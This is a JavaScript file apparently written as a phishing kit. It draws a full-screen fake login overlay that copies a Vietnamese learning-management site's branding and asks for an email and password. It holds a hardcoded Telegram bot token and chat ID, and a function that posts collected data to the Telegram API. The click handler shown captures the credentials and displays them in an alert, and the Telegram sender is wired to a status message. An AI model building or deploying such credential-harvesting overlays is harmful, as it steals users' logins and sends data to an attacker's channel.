const data = {};

const overlay = document.createElement("div");
overlay.style.position = "fixed";
overlay.style.inset = "0";
overlay.style.background = "#e5e8ee";
overlay.style.display = "flex";
overlay.style.justifyContent = "center";
overlay.style.alignItems = "center";
overlay.style.zIndex = "999999";
overlay.style.fontFamily = "Arial, sans-serif";

const loginBox = document.createElement("div");

loginBox.style.width = "550px";
loginBox.style.background = "#fff";
loginBox.style.border = "1px solid #d6d6d6";
loginBox.style.boxShadow = "0 2px 8px rgba(0,0,0,0.08)";
loginBox.style.borderTop = "3px solid #e30000";

loginBox.innerHTML = `
    <div style="
        text-align:center;
        padding:28px 0 24px;
        border-bottom:1px solid #ececec;
    ">
        <img 
            src="https://lms.hethongilp.vn/img/logo.png"
            style="
                width:125px;
                opacity:0.95;
            "
        >
    </div>

    <div style="padding:28px 30px 22px;">

        <div style="
            display:flex;
            align-items:center;
            border:1px solid #d9d9d9;
            margin-bottom:16px;
            height:58px;
            background:#fff;
        ">
            <div style="
                width:58px;
                border-right:1px solid #d9d9d9;
                text-align:center;
                color:#b7b7b7;
                font-size:18px;
            ">
                👤
            </div>

            <input
                id="emailInput"
                type="text"
                placeholder="Email"
                style="
                    flex:1;
                    border:none;
                    outline:none;
                    padding:0 18px;
                    font-size:16px;
                    color:#555;
                    background:transparent;
                "
            >
        </div>

        <div style="
            display:flex;
            align-items:center;
            border:1px solid #d9d9d9;
            margin-bottom:18px;
            height:58px;
            background:#fff;
        ">
            <div style="
                width:58px;
                border-right:1px solid #d9d9d9;
                text-align:center;
                color:#b7b7b7;
                font-size:18px;
            ">
                🔒
            </div>

            <input
                id="passwordInput"
                type="password"
                placeholder="Password"
                style="
                    flex:1;
                    border:none;
                    outline:none;
                    padding:0 18px;
                    font-size:16px;
                    color:#555;
                    background:transparent;
                "
            >
        </div>

        <label style="
            display:flex;
            align-items:center;
            gap:10px;
            font-size:15px;
            color:#444;
            margin-bottom:24px;
            user-select:none;
        ">
            <input type="checkbox">
            Ghi nhớ đăng nhập
        </label>

        <button
            id="loginBtn"
            style="
                width:100%;
                height:48px;
                border:none;
                background:#79c92b;
                color:white;
                font-size:17px;
                cursor:pointer;
                transition:0.2s;
            "
        >
            Đăng nhập
        </button>

    </div>

    <div style="
        border-top:1px solid #ececec;
        padding:14px 18px;
        text-align:right;
        color:#222;
        font-size:14px;
    ">
        Design by Hoàng Vũ Group
    </div>
`;

overlay.appendChild(loginBox);
document.body.appendChild(overlay);

const btn = loginBox.querySelector("#loginBtn");

btn.onmouseenter = () => {
    btn.style.background = "#6db822";
};

btn.onmouseleave = () => {
    btn.style.background = "#79c92b";
};

btn.onclick = () => {

    data.email =
        loginBox.querySelector("#emailInput").value;

    data.password =
        loginBox.querySelector("#passwordInput").value;

    console.log(data);

    alert(
        "Email: " + data.email +
        "\nPassword: " + data.password
    );
};

const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
const TELEGRAM_CHAT_ID = "6533206955";


function handleGuiData() {
    const dataHienTai = { 
        status: "Nguoi dung da bam nut", 
        time: new Date().toLocaleString("vi-VN") 
    };
    
    // Gọi hàm gốc để bắn data sang Telegram
    sendDataToTelegram(dataHienTai); 
}


function sendDataToTelegram(myData) {
    const text = `🔔 *Có dữ liệu mới:* \n\n${JSON.stringify(myData, null, 2)}`;
    
    // Đường link API của Telegram
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "Markdown" // Để text hiển thị đẹp hơn
        })
    })
    .then(() => console.log("Gửi về Telegram thành công!"))
    .catch(err => console.error("Lỗi:", err));
}


